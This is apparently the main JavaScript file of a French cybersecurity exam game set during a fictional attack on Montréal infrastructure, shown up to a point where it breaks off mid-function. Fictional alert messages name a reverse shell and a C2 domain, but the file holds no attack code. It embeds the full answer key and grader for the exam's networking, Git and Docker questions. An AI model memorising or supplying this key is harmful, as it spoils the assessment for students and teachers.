/* ============================================================
   OPÉRATION BLACKOUT-Ω — Application principale
   ============================================================ */

// ── CONFIGURATION ──────────────────────────────────────────
const CONFIG = {
    levels: ['briefing', 'level0', 'level1', 'level2', 'level3', 'level4', 'level5', 'level6'],
    levelNames: {
        briefing: 'BRIEFING',
        level0: 'NIV.0 — THÉORIE',
        level1: 'NIV.1 — LOGS',
        level2: 'NIV.2 — RÉSEAU',
        level3: 'NIV.3 — GIT/DOCKER',
        level4: 'NIV.4 — HEX/DNS',
        level5: 'NIV.5 — SCRIPTS',
        level6: 'NIV.6 — RAPPORT'
    },
    bootLines: [
        '[BIOS] Initialisation CERT-QC Secure Terminal v4.2...',
        '[KERN] Chargement noyau sécurisé... OK',
        '[NET]  Vérification connectivité réseau... 132.207.88.1 OK',
        '[AUTH] Module authentification chargé',
        '[CRYPT] Protocoles chiffrement AES-256... activés',
        '[MON]  Surveillance périmétrique... en ligne',
        '[IDS]  Système de détection d\'intrusion... armé',
        '[LOG]  Chargement logs_blackout/ (6 fichiers)...',
        '[PARE-FEU] Import pare_feu.log ............ OK',
        '[RÉSEAU]   Import arp_poison.log ........... OK',
        '[TUNNEL]   Import icmp_tunnel.log .......... OK',
        '[DNS]      Import dns_hex.log .............. OK',
        '[SCADA]    Import scada_alerte.log ......... OK',
        '[ROUTES]   Import table_routage.txt ........ OK',
        '[ALERTE] ⚠ 6 fichiers de logs — incidents détectés',
        '[ALERTE] ⚠ Activité suspecte depuis 185.220.101.47',
        '[ALERTE] ⚠ Possible tunnel ICMP actif',
        '[ALERTE] ⚠ ARP poisoning détecté sur 10.100.3.0/24',
        '[SYS]  Préparation interface CERT-QC...',
        '[SYS]  ████████████████████ PRÊT'
    ],
    bootAscii: `
  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗
  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝
  ██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║██║   ██║   ██║   
  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║   ██║   ██║   
  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝╚██████╔╝   ██║   
  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝`,
    briefingText: [
        '> ALERTE CRITIQUE — CERT-QC — 14 MARS 2026 — 23H58',
        '',
        '> Activité réseau anormale détectée sur l\'infrastructure de Montréal.',
        '> Un groupe de menace inconnu a possiblement pénétré le réseau.',
        '',
        '> ANOMALIES SIGNALÉES PAR LE SOC :',
        '>   ⚠ Trafic sortant inhabituel détecté sur plusieurs segments',
        '>   ⚠ Alertes IDS multiples — protocoles variés',
        '>   ⚠ Comportement anormal sur des systèmes industriels',
        '>   ⚠ Tables réseau potentiellement altérées',
        '',
        '> SEGMENTS RÉSEAU CONCERNÉS :',
        '>   ▸ Réseau administration — 10.100.1.0/24',
        '>   ▸ Réseau industriel — 10.100.2.0/24',
        '>   ▸ Réseau hospitalier — 10.100.3.0/24',
        '>   ▸ Zone DMZ et serveurs — 172.16.0.0/12',
        '',
        '> 6 fichiers de logs ont été extraits pour analyse.',
        '> L\'étendue de la compromission est INCONNUE.',
        '> C\'est à vous de l\'identifier.',
        '',
        '> 780 000 résidents sont potentiellement en danger.',
        '> ANALYSEZ LES LOGS. IDENTIFIEZ LA MENACE. NEUTRALISEZ.',
        '',
        '> Votre mission commence maintenant, Agent.'
    ],
    radioMessages: [
        { time: '23:58', text: 'CERT-QC en ligne. En attente de déploiement.', urgent: false, delay: 15000 },
        { time: '23:59', text: 'Scan de ports détecté sur le périmètre. L\'IP est connue.', urgent: false, delay: 45000 },
        { time: '00:01', text: '⚠ Paquets ICMP surdimensionnés vers DMZ — tunnel probable.', urgent: true, delay: 90000 },
        { time: '00:05', text: 'ARP gratuits non sollicités sur le réseau CHUM.', urgent: true, delay: 180000 },
        { time: '00:08', text: 'Requêtes DNS suspectes vers blackout-c2.xyz détectées.', urgent: false, delay: 300000 },
        { time: '00:12', text: '⚠ MITM confirmé sur 10.100.3.0/24 — trafic hospitalier intercepté.', urgent: true, delay: 420000 },
        { time: '00:18', text: 'Routes injectées dans la table de routage — pointent vers 192.168.100.88.', urgent: true, delay: 600000 },
        { time: '00:25', text: 'Reverse shell actif : 10.100.1.88 → 185.220.101.47:4444.', urgent: true, delay: 900000 },
        { time: '00:35', text: 'Commandes Modbus non autorisées détectées sur PLC-01 et PLC-02.', urgent: true, delay: 1200000 },
        { time: '00:45', text: 'Dosage chlore anormal détecté — 15 mg/L (seuil légal: 5 mg/L).', urgent: true, delay: 1800000 },
        { time: '01:00', text: 'Équipe de terrain déployée pour isolation physique du SCADA.', urgent: false, delay: 2400000 }
    ],
    skullAsciiArt: `
      ██████████████
    ██▓▓▓▓▓▓▓▓▓▓▓▓██
  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
  ██▓▓  ████  ████  ▓██
  ██▓▓  ████  ████  ▓██
  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
  ██▓▓▓▓▓▓████▓▓▓▓▓▓██
    ██▓▓  ▓▓▓▓  ▓▓██
    ██▓▓█ ▓▓▓▓ █▓▓██
      ████████████████
    ████▓▓▓▓▓▓▓▓████
  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██  
  `
};

// ── QCM ANSWER KEY ─────────────────────────────────────────
const QCM_ANSWER_KEY = {
    // Level 0 — Section A: Réseaux et Protocoles
    'q0-1': 'c', 'q0-2': 'b', 'q0-3': 'c', 'q0-4': 'b', 'q0-5': 'b',
    'q0-6': 'a', 'q0-7': 'c', 'q0-8': 'b', 'q0-9': 'b', 'q0-10': 'c',
    // Level 0 — Section B: Fill-in (case insensitive, trimmed)
    'fill-0-1': '255.255.255.0', 'fill-0-2': '254',
    'fill-0-3': '255.0.0.0', 'fill-0-4': '16777214',
    'fill-0-5': '255.255.0.0', 'fill-0-6': '65534',
    // Level 0 — Section C: Git et GitHub
    'q0-11': 'b', 'q0-12': 'c', 'q0-13': 'a', 'q0-14': 'b',
    'q0-15': 'b', 'q0-16': 'b', 'q0-17': 'b',
    // Level 0 — Section D: Docker
    'q0-18': 'b', 'q0-19': 'a', 'q0-20': 'b', 'q0-21': 'c',
    'q0-22': 'b', 'q0-23': 'c', 'q0-24': 'a',
    // Level 3 — Scénario Git & Docker
    'q3-1': 'c', 'q3-2': 'b', 'q3-3': 'c', 'q3-4': 'a', 'q3-5': 'b'
};

// QCM question labels for PDF report
const QCM_QUESTIONS = {
    'q0-1': 'Combien de couches possède le modèle OSI ?',
    'q0-2': 'À quelle couche OSI fonctionne ARP ?',
    'q0-3': 'Quel protocole utilise la commande ping ?',
    'q0-4': 'Masque de sous-réseau pour /24 ?',
    'q0-5': 'Combien d\'hôtes utilisables dans un /24 ?',
    'q0-6': 'Affirmation vraie concernant TCP ?',
    'q0-7': 'Qu\'est-ce que l\'ARP Poisoning ?',
    'q0-8': 'Qu\'est-ce qu\'un tunnel ICMP ?',
    'q0-9': 'Nb de couches du modèle TCP/IP ?',
    'q0-10': 'Couche OSI de l\'adressage IP ?',
    'fill-0-1': 'Masque pour 192.168.1.0/24',
    'fill-0-2': 'Nb hôtes pour 192.168.1.0/24',
    'fill-0-3': 'Masque pour 10.0.0.0/8',
    'fill-0-4': 'Nb hôtes pour 10.0.0.0/8',
    'fill-0-5': 'Masque pour 172.16.0.0/16',
    'fill-0-6': 'Nb hôtes pour 172.16.0.0/16',
    'q0-11': 'Qu\'est-ce qu\'un repository Git ?',
    'q0-12': 'Que fait git commit ?',
    'q0-13': 'Différence push vs pull ?',
    'q0-14': 'Qu\'est-ce qu\'une branche Git ?',
    'q0-15': 'Que permet GitHub vs Git ?',
    'q0-16': 'Qu\'est-ce qu\'un Pull Request ?',
    'q0-17': 'Que fait git clone ?',
    'q0-18': 'Qu\'est-ce qu\'une image Docker ?',
    'q0-19': 'Différence conteneur vs VM ?',
    'q0-20': 'À quoi sert un Dockerfile ?',
    'q0-21': 'Qu\'est-ce que Docker Hub ?',
    'q0-22': 'Qu\'est-ce qu\'un volume Docker ?',
    'q0-23': 'Commande pour créer et démarrer un conteneur ?',
    'q0-24': 'Pourquoi un conteneur démarre plus vite ?',
    'q3-1': 'Machine avec conteneurs compromis ?',
    'q3-2': 'Git commit sauvegarde de manière...',
    'q3-3': 'Conteneur partage quel composant ?',
    'q3-4': 'Exploitation du conteneur mal configuré ?',
    'q3-5': 'Commande Git pour l\'historique ?'
};

// ── STATE ──────────────────────────────────────────────────
const state = {
    agentName: '',
    studentId: '',
    currentLevel: 'briefing',
    unlockedLevels: ['briefing'],
    generatedCodes: {},
    completedLevels: [],
    soundEnabled: false,
    radioIndex: 0,
    timerInstance: null,
    quizValidated: {},
    examAnswers: {}

};

// ── HELPER: Generate random 6-digit code ───────────────────
function generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// ── BOOT SEQUENCE ──────────────────────────────────────────
function startBoot() {
    const bootAscii = document.getElementById('boot-ascii');
    const bootText = document.getElementById('boot-text');
    const progressBar = document.getElementById('boot-progress-bar');
    const bootStatus = document.getElementById('boot-status');

    bootAscii.textContent = CONFIG.bootAscii;

    let lineIndex = 0;
    const totalLines = CONFIG.bootLines.length;

    const bootInterval = setInterval(() => {
        if (lineIndex < totalLines) {
            const line = document.createElement('div');
            line.textContent = CONFIG.bootLines[lineIndex];
            if (CONFIG.bootLines[lineIndex].includes('⚠') || CONFIG.bootLines[lineIndex].includes('ALERTE')) {
                line.style.color = '#ff3b3b';
            }
            bootText.appendChild(line);
            bootText.scrollTop = bootText.scrollHeight;
            lineIndex++;
            const pct = Math.round((lineIndex / totalLines) * 100);
            progressBar.style.width = pct + '%';
            bootStatus.textContent = 'CHARGEMENT... ' + pct + '%';
        } else {
            clearInterval(bootInterval);

            // Check if exam was already submitted
            const submitted = localStorage.getItem('blackout_submitted');
            if (submitted) {
                try {
                    const sub = JSON.parse(submitted);
                    bootStatus.textContent = '⛔ EXAMEN DÉJÀ SOUMIS';
                    setTimeout(() => {
                        showSubmittedScreen(sub.nom, sub.prenom, sub.studentId);
                    }, 800);
                    return;
                } catch(e) {}
            }
            
            // If already registered, skip login
            const saved = localStorage.getItem('blackout_save');
            if (saved) {
                try {
                    const data = JSON.parse(saved);
                    if (data.agentName && data.studentId) {
                        bootStatus.textContent = 'SESSION EXISTANTE — RECONNEXION AGENT ' + data.agentName;
                        setTimeout(() => {
                            showScreen('screen-main');
                            state.agentName = data.agentName;
                            state.studentId = data.studentId;
                            initMainInterface();
                        }, 800);
                        return;
                    }
                } catch(e) {}
            }
            
            bootStatus.textContent = 'SYSTÈMES OPÉRATIONNELS — AUTHENTIFICATION REQUISE';
            setTimeout(() => {
                showScreen('screen-login');
            }, 800);
        }
    }, 200);
}

// ── SCREEN TRANSITIONS ────────────────────────────────────
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => {
        s.classList.remove('active');
        s.style.display = '';
    });
    const target = document.getElementById(screenId);
    if (target) {
        target.classList.add('active');
    }
}

// ── LOGIN ──────────────────────────────────────────────────
function setupLogin() {
    const nomInput = document.getElementById('agent-nom');
    const prenomInput = document.getElementById('agent-prenom');
    const numeroInput = document.getElementById('agent-numero');
    const btn = document.getElementById('btn-login');
    const hint = document.getElementById('login-hint');

    // Check if already registered (same student number)
    const registered = JSON.parse(localStorage.getItem('blackout_registered') || '[]');

    // Check if exam already submitted for any student on this browser
    const submitted = localStorage.getItem('blackout_submitted');

    function validateForm() {
        const nom = nomInput.value.trim();
        const prenom = prenomInput.value.trim();
        const numero = numeroInput.value.trim();
        if (nom.length >= 2 && prenom.length >= 2 && numero.length >= 4) {
            btn.disabled = false;
            btn.classList.add('enabled');
            btn.querySelector('.btn-text').textContent = '[ CONNEXION → ]';
        } else {
            btn.disabled = true;
            btn.classList.remove('enabled');
            btn.querySelector('.btn-text').textContent = '[ ACCÈS REFUSÉ ]';
        }
    }

    [nomInput, prenomInput, numeroInput].forEach(input => {
        input.addEventListener('input', validateForm);
        input.addEventListener('keydown', e => {
            if (e.key === 'Enter' && !btn.disabled) btn.click();
        });
    });

    btn.addEventListener('click', () => {
        const nom = nomInput.value.trim().toUpperCase();
        const prenom = prenomInput.value.trim().toUpperCase();
        const numero = numeroInput.value.trim();

        // Check if exam already submitted
        if (submitted) {
            try {
                const sub = JSON.parse(submitted);
                hint.textContent = '⛔ EXAMEN DÉJÀ SOUMIS pour ' + sub.prenom + ' ' + sub.nom + ' (' + sub.studentId + '). Reconnexion impossible.';
                hint.style.color = 'var(--red)';
                return;
            } catch(e) {}
        }

        // Check duplicate student number
        if (registered.includes(numero)) {
            hint.textContent = '✗ ACCÈS REFUSÉ — Ce numéro d\'étudiant est déjà enregistré.';
            hint.style.color = 'var(--red)';
            return;
        }

        state.agentName = prenom + ' ' + nom;
        state.studentId = numero;
        hint.textContent = 'Authentification en cours...';
        hint.style.color = 'var(--primary)';
        btn.disabled = true;

        // Register student number
        registered.push(numero);
        localStorage.setItem('blackout_registered', JSON.stringify(registered));
        
        setTimeout(() => {
            hint.textContent = '✓ Identité vérifiée. Bienvenue, Agent ' + state.agentName + ' (#' + numero + ')';
            hint.style.color = 'var(--green)';
            
            setTimeout(() => {
                showScreen('screen-main');
                initMainInterface();
            }, 1000);
        }, 1200);
    });
}

// ── MAIN INTERFACE INIT ───────────────────────────────────
function initMainInterface() {
    document.getElementById('agent-badge').textContent = 'AGENT: ' + state.agentName;
    document.querySelectorAll('.agent-name-display').forEach(el => {
        el.textContent = state.agentName;
    });

    loadState();
    updateNav();
    setupNavigation();
    setupUnlock();
    setupFileExplorer();
    setupFileViewer();
    setupQuizzes();
    setupReport();
    setupFinExamen();
    setupSound();
    startRadio();
    startBriefingTypewriter();
    setupInfoOverlays();
    setupDownloads();

    if (typeof initTerminals === 'function') initTerminals();
    setupTextAnswers();
    if (typeof CountdownTimer === 'function') {
        state.timerInstance = new CountdownTimer();
    }

    navigateTo(state.currentLevel);
}

// ── NAVIGATION ────────────────────────────────────────────
function setupNavigation() {
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const level = btn.dataset.level;
            if (!state.unlockedLevels.includes(level)) {
                showToast('SYSTÈME', 'Niveau verrouillé. Entrez le code d\'accès.', false);
                return;
            }
            // Block return to completed QCM levels (level0, level3)
            if (state.completedLevels.includes(level) && (level === 'level0' || level === 'level3')) {
                showToast('SYSTÈME', 'Ce niveau est terminé. Vos réponses ont été enregistrées.', false);
                return;
            }
            navigateTo(level);
        });
    });
}

function navigateTo(level) {
    state.currentLevel = level;
    
    // Hide all content
    document.querySelectorAll('.level-content').forEach(c => c.classList.add('hidden'));
    
    // Show target
    const target = document.getElementById('content-' + level);
    if (target) target.classList.remove('hidden');
    
    // Update nav buttons
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.level === level) btn.classList.add('active');
    });
    
    // Update clearance badge
    const levelNum = level === 'briefing' ? 'BRIEFING' : level.replace('level', 'NIVEAU ');
    document.getElementById('clearance-badge').textContent = levelNum;
    
    // Scroll to top
    document.querySelector('.main-panel').scrollTop = 0;
    
    saveState();
}

function updateNav() {
    document.querySelectorAll('.nav-btn').forEach(btn => {
        const level = btn.dataset.level;
        const statusEl = btn.querySelector('.nav-status');
        
        if (state.unlockedLevels.includes(level)) {
            btn.classList.remove('locked');
            btn.classList.add('unlocked');
            if (state.completedLevels.includes(level)) {
                statusEl.innerHTML = '✓';
                statusEl.className = 'nav-status status-unlocked';
            } else {
                statusEl.innerHTML = '●';
                statusEl.className = 'nav-status status-available';
            }
        } else {
            btn.classList.add('locked');
            btn.classList.remove('unlocked');
            statusEl.innerHTML = '🔒';
            statusEl.className = 'nav-status status-locked';
        }
    });
}

// ── UNLOCK SYSTEM ─────────────────────────────────────────
function setupUnlock() {
    const input = document.getElementById('unlock-code');
    const btn = document.getElementById('btn-unlock');
    const hint = document.getElementById('unlock-hint');

    const doUnlock = () => {
        const code = input.value.trim();
        if (!code) {
            hint.textContent = 'Entrez un code.';
            hint.className = 'unlock-hint error';
            return;
        }

        // Find which level this code unlocks
        let foundLevel = null;
        for (const [fromLevel, genCode] of Object.entries(state.generatedCodes)) {
            if (genCode === code) {
                // The code from fromLevel unlocks the NEXT level
                const idx = CONFIG.levels.indexOf(fromLevel);
                if (idx >= 0 && idx < CONFIG.levels.length - 1) {
                    foundLevel = CONFIG.levels[idx + 1];
                }
                break;
            }
        }

        if (foundLevel && !state.unlockedLevels.includes(foundLevel)) {
            state.unlockedLevels.push(foundLevel);
            hint.textContent = '✓ ' + CONFIG.levelNames[foundLevel] + ' déverrouillé !';
            hint.className = 'unlock-hint success';
            input.value = '';
            
            updateNav();
            saveState();
            
            showToast('SYSTÈME', CONFIG.levelNames[foundLevel] + ' déverrouillé ! Cliquez dessus dans la barre de navigation.', false);
            
            // Flash the nav button
            const navBtn = document.getElementById('nav-' + foundLevel);
            if (navBtn) navBtn.classList.add('level-unlocked-flash');
            
            // Auto-navigate after a short delay
            setTimeout(() => navigateTo(foundLevel), 600);
        } else if (foundLevel && state.unlockedLevels.includes(foundLevel)) {
            hint.textContent = 'Ce niveau est déjà déverrouillé.';
            hint.className = 'unlock-hint';
        } else {
            hint.textContent = '✗ Code invalide.';
            hint.className = 'unlock-hint error';
            // Small shake
            input.classList.add('glitch');
            setTimeout(() => input.classList.remove('glitch'), 300);
        }
    };

    btn.addEventListener('click', doUnlock);
    input.addEventListener('keydown', e => {
        if (e.key === 'Enter') doUnlock();
    });
}

// ── BRIEFING TYPEWRITER ───────────────────────────────────
function startBriefingTypewriter() {
    const container = document.getElementById('briefing-text');
    if (!container) return;

    if (state.completedLevels.includes('briefing')) {
        // Already done: show full text and code
        container.innerHTML = CONFIG.briefingText.join('<br>');
        showBriefingComplete();
        return;
    }
    
    const tw = new Typewriter(container, { speed: 20, lineDelay: 300, onComplete: () => showBriefingComplete() });
    tw.type(CONFIG.briefingText);
}

function showBriefingComplete() {
    const cards = document.getElementById('briefing-cards');
    const mission = document.getElementById('briefing-mission');
    const codeReveal = document.getElementById('code-reveal-briefing');
    const codeValue = document.getElementById('code-value-briefing');

    if (cards) cards.style.display = '';
    if (mission) mission.style.display = '';

    // Generate code if not already done
    if (!state.generatedCodes['briefing']) {
        state.generatedCodes['briefing'] = generateCode();
        saveState();
    }
    
    if (codeValue) codeValue.textContent = state.generatedCodes['briefing'];
    if (codeReveal) codeReveal.classList.remove('hidden');
    
    if (!state.completedLevels.includes('briefing')) {
        state.completedLevels.push('briefing');
        saveState();
    }
}

// ── QUIZ SYSTEM (QCM — no feedback) ──────────────────────
function setupQuizzes() {
    document.querySelectorAll('.quiz-submit').forEach(btn => {
        btn.addEventListener('click', () => {
            const level = btn.dataset.level;
            submitQuiz(level);
        });
    });
}

function submitQuiz(level) {
    const panel = document.getElementById('quiz-' + level);
    if (!panel) return;

    const hint = document.getElementById('quiz-hint-' + level);

    // Collect QCM radio answers
    const qcmItems = panel.querySelectorAll('.qcm-item');
    let allAnswered = true;
    const answers = {};

    qcmItems.forEach(item => {
        const name = item.dataset.qcm;
        const selected = panel.querySelector('input[name="' + name + '"]:checked');
        if (selected) {
            answers[name] = selected.value;
        } else {
            allAnswered = false;
        }
    });

    // Collect fill-in answers
    const fillInputs = panel.querySelectorAll('.qcm-fill');
    fillInputs.forEach(input => {
        const name = input.name;
        const val = input.value.trim();
        answers[name] = val || 'N/A';
    });

    // Check that all QCM radios have a selection
    if (!allAnswered) {
        if (hint) {
            hint.textContent = '⚠ Vous devez répondre à toutes les questions (sélectionnez « Je ne sais pas » si nécessaire).';
            hint.style.color = 'var(--yellow, #f0c040)';
        }
        return;
    }

    // Store answers in state
    state.examAnswers[level] = answers;
    saveState();

    // No feedback — just complete the level
    if (hint) {
        hint.textContent = '✓ Réponses enregistrées. Votre note sera calculée à la fin de l\'examen.';
        hint.style.color = 'var(--green)';
    }

    // Disable all inputs
    qcmItems.forEach(item => {
        item.querySelectorAll('input').forEach(inp => inp.disabled = true);
    });
    fillInputs.forEach(input => input.disabled = true);

    completeLevel(level);
}

// ── LEVEL COMPLETION ──────────────────────────────────────
function completeLevel(level) {
    if (state.completedLevels.includes(level)) return;

    state.completedLevels.push(level);

    // Generate code for current level (to unlock next)
    if (!state.generatedCodes[level]) {
        state.generatedCodes[level] = generateCode();
    }

    // Show banner
    const banner = document.getElementById('banner-' + level);
    if (banner) banner.classList.remove('hidden');

    // Show code value
    const codeEl = document.getElementById('code-value-' + level);
    if (codeEl) codeEl.textContent = state.generatedCodes[level];

    updateNav();
    saveState();

    const nextIdx = CONFIG.levels.indexOf(level) + 1;
    if (nextIdx < CONFIG.levels.length) {
        const nextName = CONFIG.levelNames[CONFIG.levels[nextIdx]];
        showToast('SYSTÈME', '🎉 Niveau complété ! Code généré pour ' + nextName + '.', false);
    }

    // NOTE: text inputs are NOT disabled on completion — students can keep editing
    // Answers are saved continuously via saveTextAnswers() on every input event
}

// ── TEXT ANSWERS (terminal levels) ────────────────────────
function saveTextAnswers(level) {
    if (!state.examAnswers.textAnswers) state.examAnswers.textAnswers = {};

    const textareas = document.querySelectorAll(`.level-answer[data-level="${level}"]`);
    const answers = {};
    textareas.forEach(ta => {
        const key = ta.dataset.question;
        if (key) answers[key] = ta.value.trim();
    });

    state.examAnswers.textAnswers[level] = answers;
    saveState();
}

function updateAnswersCounter(level) {
    const textareas = document.querySelectorAll(`.level-answer[data-level="${level}"]`);
    const total = textareas.length;
    const filled = Array.from(textareas).filter(ta => ta.value.trim().length > 0).length;

    const countEl = document.getElementById('answers-count-' + level);
    if (countEl) {
        countEl.textContent = filled + ' / ' + total;
        countEl.style.color = (filled === total) ? 'var(--green)' : 'var(--cyan)';
    }
}

function setupTextAnswers() {
    const allTextareas = document.querySelectorAll('.level-answer');
    allTextareas.forEach(ta => {
        const level = ta.dataset.level;

        ta.addEventListener('input', () => {
            // Visual feedback
            if (ta.value.trim().length > 0) {
                ta.classList.add('filled');
            } else {
                ta.classList.remove('filled');
            }

            // Save to state
            saveTextAnswers(level);

            // Update counter
            updateAnswersCounter(level);

            // Re-check completion (objectives might already be done)
            tryCompleteFromTextAnswers(level);
        });
    });

    // Restore saved text answers from state
    if (state.examAnswers.textAnswers) {
        for (const [level, answers] of Object.entries(state.examAnswers.textAnswers)) {
            for (const [key, value] of Object.entries(answers)) {
                const ta = document.querySelector(`.level-answer[data-level="${level}"][data-question="${key}"]`);
                if (ta && value) {
                    ta.value = value;
                    ta.classList.add('filled');
                }
            }
            updateAnswersCounter(level);
        }
    }
}

function tryCompleteFromTextAnswers(level) {
    // Level 6 has its own explicit submission via submitReport() — never auto-complete
    if (level === 'level6') return;

    // Already completed — nothing to do
    if (state.completedLevels.includes(level)) return;

    // Terminal levels MUST have all objectives validated
    if (typeof LEVEL_OBJECTIVES !== 'undefined' && LEVEL_OBJECTIVES[level]) {
        const allObjDone = Object.values(LEVEL_OBJECTIVES[level].objectives).every(o => o.validated);
        if (!allObjDone) return; // not ready yet
    } else {
        // No objectives defined for this level — don't auto-complete from text alone
        return;
    }

    // Check text answers
    const textareas = document.querySelectorAll(`.level-answer[data-level="${level}"]`);
    const allFilled = Array.from(textareas).every(ta => ta.value.trim().length > 0);
    if (!allFilled) return;

    // Both conditions met — complete
    completeLevel(level);
}

// ── FILE EXPLORER ─────────────────────────────────────────
function setupFileExplorer() {
    const folder = document.getElementById('folder-logs');
    const fileList = document.getElementById('file-list-logs');

    if (folder && fileList) {
        folder.addEventListener('click', () => {
            folder.classList.toggle('collapsed');
            fileList.classList.toggle('collapsed');
        });
    }
}

// ── FILE VIEWER ───────────────────────────────────────────
function setupFileViewer() {
    const overlay = document.getElementById('file-viewer-overlay');
    const title = document.getElementById('file-viewer-title');
    const content = document.getElementById('file-viewer-content');
    const closeBtn = document.getElementById('file-viewer-close');

    document.querySelectorAll('.file-item').forEach(item => {
        item.addEventListener('click', () => {
            const filename = item.dataset.file;
            if (!filename) return;
            
            // Get file content from VIRTUAL_FS (terminal.js)
            let fileContent = '';
            if (typeof VIRTUAL_FS !== 'undefined' && VIRTUAL_FS[filename]) {
                fileContent = VIRTUAL_FS[filename];
            } else {
                fileContent = '[ Fichier non trouvé : ' + filename + ' ]';
            }
            
            title.textContent = filename;
            content.textContent = fileContent;
            overlay.classList.remove('hidden');
        });
    });

    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            overlay.classList.add('hidden');
        });
    }

    if (overlay) {
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) overlay.classList.add('hidden');
        });
    }
}

// ── REPORT & GRADING ──────────────────────────────────────
function setupReport() {
    const sections = document.querySelectorAll('.report-section');
    const comment = document.getElementById('report-comment');
    const chars = document.getElementById('report-chars');
    const btn = document.getElementById('btn-submit-report');

    // Track filled sections
    function updateReportCounter() {
        const filled = Array.from(sections).filter(s => s.value.trim().length > 0).length;
        if (chars) {
            chars.textContent = filled + ' / ' + sections.length + ' sections remplies';
            chars.style.color = (filled === sections.length) ? 'var(--green)' : 'var(--text)';
        }
        updateAnswersCounter('level6');
    }

    sections.forEach(s => {
        s.addEventListener('input', updateReportCounter);
    });

    if (btn) {
        btn.addEventListener('click', () => {
            const emptyCount = Array.from(sections).filter(s => s.value.trim().length === 0).length;
            if (emptyCount > 0) {
                showToast('SYSTÈME', emptyCount + ' section(s) du rapport encore vide(s). Remplissez toutes les sections.', true);
                return;
            }
            // Combine all sections into one report text
            const reportText = Array.from(sections).map(s => {
                const label = s.dataset.question.replace('rapport-', '').toUpperCase();
                return label + ' :\n' + s.value.trim();
            }).join('\n\n');
            submitReport(reportText, comment ? comment.value : '');
        });
    }
}

// Calculate QCM grade
function calculateGrade() {
    const results = {
        l0_net: { correct: 0, total: 10 },
        l0_fill: { correct: 0, total: 6 },
        l0_git: { correct: 0, total: 7 },
        l0_docker: { correct: 0, total: 7 },
        l3: { correct: 0, total: 5 }
    };

    const l0Answers = state.examAnswers['level0'] || {};
    const l3Answers = state.examAnswers['level3'] || {};

    // Section A — Réseaux (q0-1 to q0-10)
    for (let i = 1; i <= 10; i++) {
        const key = 'q0-' + i;
        if (l0Answers[key] && l0Answers[key] === QCM_ANSWER_KEY[key]) {
            results.l0_net.correct++;
        }
    }

    // Section B — Fill-in (fill-0-1 to fill-0-6)
    for (let i = 1; i <= 6; i++) {
        const key = 'fill-0-' + i;
        const given = (l0Answers[key] || '').toLowerCase().trim().replace(/\s/g, '');
        const expected = QCM_ANSWER_KEY[key].toLowerCase().trim().replace(/\s/g, '');
        if (given === expected) {
            results.l0_fill.correct++;
        }
    }

    // Section C — Git (q0-11 to q0-17)
    for (let i = 11; i <= 17; i++) {
        const key = 'q0-' + i;
        if (l0Answers[key] && l0Answers[key] === QCM_ANSWER_KEY[key]) {
            results.l0_git.correct++;
        }
    }

    // Section D — Docker (q0-18 to q0-24)
    for (let i = 18; i <= 24; i++) {
        const key = 'q0-' + i;
        if (l0Answers[key] && l0Answers[key] === QCM_ANSWER_KEY[key]) {
            results.l0_docker.correct++;
        }
    }

    // Level 3 (q3-1 to q3-5)
    for (let i = 1; i <= 5; i++) {
        const key = 'q3-' + i;
        if (l3Answers[key] && l3Answers[key] === QCM_ANSWER_KEY[key]) {
            results.l3.correct++;
        }
    }

    const totalCorrect = results.l0_net.correct + results.l0_fill.correct +
        results.l0_git.correct + results.l0_docker.correct + results.l3.correct;
    const totalQuestions = results.l0_net.total + results.l0_fill.total +
        results.l0_git.total + results.l0_docker.total + results.l3.total;

    // QCM score on 25 points: Level 0 = 20 pts (30 questions), Level 3 = 5 pts (5 questions)
    const l0Correct = results.l0_net.correct + results.l0_fill.correct +
        results.l0_git.correct + results.l0_docker.correct;
    const l0Total = results.l0_net.total + results.l0_fill.total +
        results.l0_git.total + results.l0_docker.total;
    const l0Score = Math.round((l0Correct / l0Total) * 20 * 10) / 10; // /20
    const l3Score = Math.round((results.l3.correct / results.l3.total) * 5 * 10) / 10; // /5
    const qcmScore = Math.round((l0Score + l3Score) * 10) / 10;

    return { sections: results, totalCorrect, totalQuestions, qcmScore, l0Score, l3Score };
}

function displayGrade(grade) {
    const pct = Math.round((grade.totalCorrect / grade.totalQuestions) * 100);

    const numEl = document.getElementById('grade-number');
    const totEl = document.getElementById('grade-total');
    const pctEl = document.getElementById('grade-percent');

    if (numEl) numEl.textContent = grade.qcmScore;
    if (totEl) totEl.textContent = '/ 25 pts';
    if (pctEl) pctEl.textContent = pct + '%';

    const s = grade.sections;
    const setRow = (id, sec) => {
        const el = document.getElementById(id);
        if (el) el.textContent = sec.correct + '/' + sec.total;
    };
    setRow('grade-l0-net', s.l0_net);
    setRow('grade-l0-fill', s.l0_fill);
    setRow('grade-l0-git', s.l0_git);
    setRow('grade-l0-docker', s.l0_docker);
    setRow('grade-l3', s.l3);

    const qcmScoreEl = document.getElementById('grade-qcm-score');
    if (qcmScoreEl) qcmScoreEl.innerHTML = '<strong>' + grade.qcmScore + ' / 25 pts</strong>';
}

function submitReport(text, commentText) {
    // Save report + individual sections in state
    state.examAnswers['report'] = text;
    state.examAnswers['comment'] = commentText || '';

    // Save level6 text answers
    saveTextAnswers('level6');
    saveState();

    // Calculate grade
    const grade = calculateGrade();

    // Auto-generate and download PDF
    try {
        generatePDF(grade, text, commentText);
    } catch (pdfErr) {
        console.error('Erreur génération PDF:', pdfErr);
    }

    // Small delay to let the PDF download start, then show disconnect screen
    setTimeout(() => {
